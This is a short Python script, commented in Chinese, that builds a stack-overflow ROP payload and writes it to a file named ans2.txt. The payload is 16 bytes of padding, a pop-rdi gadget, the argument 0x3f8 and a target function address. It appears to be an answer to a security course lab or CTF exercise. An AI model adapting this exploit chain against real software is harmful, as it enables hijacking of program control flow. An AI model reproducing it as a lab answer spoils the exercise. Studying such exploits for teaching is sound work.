padding = b"A" * 16  # 覆盖到返回地址

# ROP gadgets
pop_rdi = b"\xc7\x12\x40\x00\x00\x00\x00\x00"  # 0x4012c7 (pop rdi; ret)

# 参数：0x3f8 = 1016 (小端，8字节)
param = b"\xf8\x03\x00\x00\x00\x00\x00\x00"  # 0x00000000000003f8

# 目标函数
func2_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"  # 0x401216

# 构造ROP链
payload = padding + pop_rdi + param + func2_addr

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Payload written to ans2.txt")
print("Length:", len(payload), "bytes")
print("ROP链结构:")
print("  1. 16字节填充")
print("  2. pop rdi; ret @ 0x4012c7")
print("  3. 参数 0x3f8")
print("  4. func2 @ 0x401216")